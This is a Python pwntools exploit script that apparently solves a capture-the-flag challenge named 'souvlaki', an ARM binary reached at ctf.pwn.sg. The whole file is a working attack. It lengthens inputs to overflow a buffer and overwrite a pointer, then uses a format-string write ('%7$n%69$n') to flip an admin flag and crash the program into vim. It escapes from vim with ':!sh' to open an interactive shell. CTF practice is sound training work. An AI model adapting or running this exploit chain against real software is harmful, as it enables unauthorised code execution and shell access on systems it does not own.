#!/usr/bin/env python
from pwn import *

# context.log_level = 'debug'
context.arch = 'arm'
context.bits = 32

global_state = 0x98c9c
message_addr = global_state + 4
presenter_addr = global_state + 132


def main():
    # p = process("./souvlaki")
    p = remote("ctf.pwn.sg", 4006)
    current = 38

    pro = log.progress("Lengthening...")

    for i in range(91):
        pro.status(str(i) + "/90")
        p.recvuntil(")]: ")
        p.send("A" * current)
        current += 1

    pro.success("Done lengthening")

    p.clean(0.1)
    to_write = p32(message_addr)
    to_write = to_write.replace("\x00", "\n")
    p.send("A" * 128 + to_write)

    p.send("XXXX".ljust(100, "\n"))
    p.recvuntil("XXXX")

    # Overwrite admin and trigger the crash to get our vim shell
    p.send("CCCC%7$n%69$n".ljust(100, "\n"))
    p.recvuntil("Vim: Warning: Input is not from a terminal")

    # Get the shell from vim.
    p.sendline(":!sh")
    p.sendline()

    sleep(1)

    log.success("Enjoy your shell!")
    p.interactive()


if __name__ == '__main__':
    main()
